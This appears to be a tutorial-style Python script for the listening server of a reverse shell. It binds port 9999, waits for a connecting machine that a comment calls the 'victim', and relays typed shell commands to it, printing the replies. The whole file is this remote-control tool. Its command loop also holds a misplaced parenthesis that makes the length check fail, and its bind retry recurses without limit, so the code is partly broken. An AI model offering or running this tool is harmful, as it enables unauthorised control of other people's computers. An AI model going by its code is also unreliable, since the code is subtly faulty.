import socket
import sys

def create_socket():
    try:
        global host
        global port
        global s #socket variable
        host =''
        port=9999 #we can use any unused port mostly 9999 is not widely used
        s=socket.socket()
    except socket.error as msg:
        print("Socket creation error: " +str(msg))
        

#Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        
        print("Binding the Port "+ str(port))
        
        s.bind((host,port))
        s.listen(5)  # 5 is number of bad connection it will tolerate after this it will through exception
        
    except socket.error as msg:
        print("Socket binding error "+ str(msg)+"\n"+"Retrying....")
        bind_socket() #Recursively call bind_socket() function again after connection failed
        


#Establishing connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been estalished !" + " IP " + address[0] + " !Port "+str(address[1]))
    send_commands(conn)
    conn.close()
        
#send command to client /victim / friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd =="quit":
            conn.close()
            s.close()
            sys.exit()
            
        if len(str.encode(cmd) >0):
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")
            
def main():
    create_socket()
    bind_socket()
    socket_accept()
    
main()
    
    
    
    
    
    
    
    
        
    
